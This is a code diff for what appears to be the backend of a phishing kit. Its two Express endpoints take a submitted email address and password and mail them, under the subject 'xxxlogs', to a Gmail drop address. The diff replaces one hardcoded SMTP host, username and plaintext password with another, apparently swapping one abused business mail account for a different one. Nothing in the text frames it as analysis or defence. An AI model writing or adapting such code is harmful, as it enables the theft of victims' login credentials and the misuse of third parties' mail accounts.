@@ -18,11 +18,11 @@ app.post("/sendmail", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.ptninsurancebroker.com",
+      host: "mail.korarahighlandstea.com",
       port: 465,
       auth: {
-        user: "ptn2center@ptninsurancebroker.com",
-        pass: "IctllU2181j511",
+        user: "info@korarahighlandstea.com",
+        pass: "chai2025!",
       },
     });
     let info = await transporter.sendMail({
@@ -52,15 +52,15 @@ app.post("/sendmail2", async (req, res) => {
   const { email, pass, pasers } = req.body;
   try {
     let transporter = nodemailer.createTransport({
-      host: "mail.ptninsurancebroker.com",
+      host: "mail.korarahighlandstea.com",
       port: 465,
       auth: {
-        user: "ptn2center@ptninsurancebroker.com",
-        pass: "IctllU2181j511",
+        user: "info@korarahighlandstea.com",
+        pass: "chai2025!",
       },
     });
     let info = await transporter.sendMail({
-      from: '"You" <ptn2center@ptninsurancebroker.com>',
+      from: '"You" <info@korarahighlandstea.com>',
       to: "sales1.ppsl@gmail.com",
       subject: "xxxlogs",
       html: `
